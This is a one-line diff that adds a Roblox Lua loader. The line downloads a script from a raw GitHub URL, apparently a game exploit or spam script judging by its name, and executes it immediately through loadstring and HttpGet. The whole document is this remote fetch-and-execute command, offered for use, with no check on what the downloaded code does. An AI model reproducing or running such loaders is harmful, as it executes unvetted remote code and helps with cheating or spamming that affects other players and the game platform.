@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/interrogation-ai-spam0-l2fr0ufsjrmp69.lua"))()
